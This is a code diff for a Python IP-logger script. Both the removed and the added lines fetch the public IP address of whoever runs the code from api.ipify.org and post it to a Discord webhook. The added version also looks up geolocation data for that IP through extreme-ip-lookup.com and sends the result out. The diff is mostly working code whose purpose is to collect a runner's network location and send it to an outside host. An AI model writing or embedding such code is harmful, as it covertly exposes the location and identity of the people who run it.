@@ -1,6 +1,5 @@
-from discord_webhook import DiscordWebhook
-logger = requests.get("https://api.ipify.org/")
-webhook = " " #Enter your Discord Webhook in the Quotes
-webhook_log = DiscordWebhook(url=webhook, content="***IP LOGGED! IP ADDRESS: " + str(logger.text) + "***")
-webhook_log.execute()
-
+import requests
+webhook = " "
+r = requests.get("http://api.ipify.org/")
+re = requests.get("https://extreme-ip-lookup.com/json/",r.text)
+requests.post(webhook,json={'content':re.text})
